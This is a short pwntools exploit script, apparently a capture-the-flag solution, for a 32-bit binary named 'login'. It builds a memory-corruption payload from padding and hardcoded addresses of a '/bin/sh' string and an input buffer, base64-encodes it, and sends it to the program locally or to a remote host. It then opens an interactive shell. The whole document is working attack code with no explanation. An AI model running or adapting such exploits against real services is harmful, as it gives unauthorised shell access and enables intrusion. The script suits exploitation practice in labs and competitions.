#!/usr/bin/env python3

from pwn import *
import base64

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
b auth
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './login'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
#context.log_level = 'debug'

# ===========================================================
#                    START OF EXPLOIT
# ===========================================================

io = start()

INPUT_ADDR = 0x0811eb40
BIN_SH_ADDR = 0x0804927f
payload = flat(
    b'A' * 4,
    p32(BIN_SH_ADDR),
    p32(INPUT_ADDR),
)
payload = base64.b64encode(payload)

# Send the payload
io.sendlineafter(b': ', payload)
io.recvline()
io.recvline()

# Receive the flag
log.info('Popping shell...')
io.interactive()
